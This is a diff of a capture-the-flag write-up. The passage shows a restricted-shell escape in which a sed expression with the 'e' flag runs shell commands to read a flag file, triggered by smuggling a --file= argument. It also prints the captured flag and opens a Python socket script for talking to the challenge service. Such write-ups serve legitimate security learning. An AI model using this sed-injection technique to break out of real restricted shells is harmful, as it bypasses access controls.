@@ -147,21 +147,22 @@ Dir access was blocked. Sed does allow for numerous wild cards though. But even 
 --file=script-file
 
               add the contents of script-file to the commands to be executed
-              ```
+```
 Pretty sure I could use that to execute a script file I made using ed (as I could only run one command in sed before session ended). Thus, the following payload, which contains a sed command 
 ```(s/.*/cd ..; ls .. -a; cd ..; cat flag/e)``` 
+
 inside a script named 'script.txt' is executed by another file written as --file=script.txt with contents --file=script.txt. This finally provided the much wanted flag:
+
 ```
 dam{is_it_w31rd_that_i_u53_ed(1)_4_fun?}
 ```
 
 This is the full script with all of its sockets :P
-```
+```python
 import socket
 import string
 
 def send_to_netcat(host, port, data):
-    """Sends data to a netcat listener and returns the response."""
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((host, port))
